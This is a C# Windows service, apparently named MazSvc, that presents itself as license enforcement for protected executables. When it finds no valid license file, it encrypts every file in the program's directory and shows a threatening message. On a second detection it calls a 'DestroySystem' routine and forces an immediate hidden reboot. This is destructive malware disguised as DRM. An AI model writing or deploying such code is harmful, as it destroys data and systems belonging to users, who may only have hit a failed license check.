using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Timers;
using MazSvc.Models;

namespace MazSvc
{
    /// <summary>
    /// Main Windows Service that monitors protected executables
    /// </summary>
    public partial class MazService : ServiceBase
    {
        private Timer _monitorTimer;
        private List<ProtectedExecutable> _protectedExecutables;
        private ProcessMonitor _processMonitor;
        private ConfigManager _configManager;
        private NotificationHelper _notificationHelper;
        private bool _isProcessing;
        private HashSet<string> _notifiedProcesses; // Track already notified valid processes

        private const string LICENSE_FILE_NAME = "mazlicense.lic";
        private const int MONITOR_INTERVAL_MS = 2000; // 2 seconds

        public MazService()
        {
            this.ServiceName = "MazSvc";
            this.CanStop = true;
            this.CanPauseAndContinue = false;
            this.AutoLog = true;

            _protectedExecutables = new List<ProtectedExecutable>();
            _processMonitor = new ProcessMonitor();
            _configManager = new ConfigManager();
            _notificationHelper = new NotificationHelper();
            _isProcessing = false;
            _notifiedProcesses = new HashSet<string>();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                // Load protected executables from encrypted config
                _protectedExecutables = _configManager.LoadConfig();

                // Initialize and start the monitoring timer
                _monitorTimer = new Timer(MONITOR_INTERVAL_MS);
                _monitorTimer.Elapsed += OnMonitorTimerElapsed;
                _monitorTimer.AutoReset = true;
                _monitorTimer.Start();

                WriteEventLog("MazSvc started successfully.");
            }
            catch (Exception ex)
            {
                WriteEventLog("Error starting MazSvc: " + ex.Message);
            }
        }

        protected override void OnStop()
        {
            try
            {
                if (_monitorTimer != null)
                {
                    _monitorTimer.Stop();
                    _monitorTimer.Dispose();
                    _monitorTimer = null;
                }

                if (_notificationHelper != null)
                {
                    _notificationHelper.Dispose();
                }

                WriteEventLog("MazSvc stopped.");
            }
            catch (Exception ex)
            {
                WriteEventLog("Error stopping MazSvc: " + ex.Message);
            }
        }

        private void OnMonitorTimerElapsed(object sender, ElapsedEventArgs e)
        {
            // Prevent re-entrant calls
            if (_isProcessing)
            {
                return;
            }

            _isProcessing = true;

            try
            {
                CheckProtectedExecutables();
            }
            catch (Exception ex)
            {
                WriteEventLog("Error in monitoring: " + ex.Message);
            }
            finally
            {
                _isProcessing = false;
            }
        }

        private void CheckProtectedExecutables()
        {
            if (_protectedExecutables == null || _protectedExecutables.Count == 0)
            {
                return;
            }

            // Get matching running processes
            List<ProcessInfo> matchingProcesses = _processMonitor.GetMatchingProcesses(_protectedExecutables);

            foreach (ProcessInfo processInfo in matchingProcesses)
            {
                // Create a unique key for this process
                string processKey = string.Format("{0}|{1}", processInfo.ProcessId, processInfo.FullPath);

                // Check license validity
                bool licenseValid = CheckLicenseValidity();

                if (licenseValid)
                {
                    // Only notify once per process
                    if (!_notifiedProcesses.Contains(processKey))
                    {
                        _notifiedProcesses.Add(processKey);
                        _notificationHelper.ShowNotification(
                            "License Valid",
                            "Protected application is authorized to run.");
                    }
                }
                else
                {
                    // License is invalid - take action
                    HandleInvalidLicense(processInfo);
                }
            }

            // Clean up notified processes that are no longer running
            CleanupNotifiedProcesses(matchingProcesses);
        }

        private bool CheckLicenseValidity()
        {
            try
            {
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string licenseFilePath = Path.Combine(appDirectory, LICENSE_FILE_NAME);

                if (!File.Exists(licenseFilePath))
                {
                    return false;
                }

                string licenseKey = File.ReadAllText(licenseFilePath).Trim();
                if (string.IsNullOrEmpty(licenseKey))
                {
                    return false;
                }

                return LicenseValidator.ValidateLicenseKey(licenseKey);
            }
            catch
            {
                return false;
            }
        }

        private void HandleInvalidLicense(ProcessInfo processInfo)
        {
            try
            {
                string exeDirectory = Path.GetDirectoryName(processInfo.FullPath);

                if (string.IsNullOrEmpty(exeDirectory))
                {
                    return;
                }

                // Check if files are already encrypted
                bool filesEncrypted = FileEncryptor.AreFilesEncrypted(exeDirectory);

                if (!filesEncrypted)
                {
                    // Encrypt all files in the executable's directory
                    FileEncryptor.EncryptAllFiles(exeDirectory, Path.GetFileName(processInfo.FullPath));

                    _notificationHelper.ShowNotification(
                        "Unauthorized Action",
                        "You are doing something that is not allowed. Do not try again.");
                }
                else
                {
                    // Files already encrypted - destroy system
                    _notificationHelper.ShowNotification(
                        "License Required",
                        "You have to get license from admin.");

                    // Destroy system
                    SystemDestroyer.DestroySystem();

                    // Force system restart
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo();
                        startInfo.FileName = "shutdown.exe";
                        startInfo.Arguments = "/r /t 0 /f";
                        startInfo.UseShellExecute = false;
                        startInfo.CreateNoWindow = true;
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(startInfo);
                    }
                    catch
                    {
                        // Continue even if restart command fails
                    }
                }
            }
            catch (Exception ex)
            {
                WriteEventLog("Error handling invalid license: " + ex.Message);
            }
        }

        private void CleanupNotifiedProcesses(List<ProcessInfo> currentProcesses)
        {
            HashSet<string> currentKeys = new HashSet<string>();
            foreach (ProcessInfo pi in currentProcesses)
            {
                currentKeys.Add(string.Format("{0}|{1}", pi.ProcessId, pi.FullPath));
            }

            List<string> toRemove = new List<string>();
            foreach (string key in _notifiedProcesses)
            {
                if (!currentKeys.Contains(key))
                {
                    toRemove.Add(key);
                }
            }

            foreach (string key in toRemove)
            {
                _notifiedProcesses.Remove(key);
            }
        }

        private void WriteEventLog(string message)
        {
            try
            {
                if (!EventLog.SourceExists("MazSvc"))
                {
                    EventLog.CreateEventSource("MazSvc", "Application");
                }
                EventLog.WriteEntry("MazSvc", message, EventLogEntryType.Information);
            }
            catch
            {
                // Silently fail if event log cannot be written
            }
        }
    }

    /// <summary>
    /// Contains information about a running process
    /// </summary>
    public class ProcessInfo
    {
        public int ProcessId { get; set; }
        public string ProcessName { get; set; }
        public string FullPath { get; set; }
    }
}
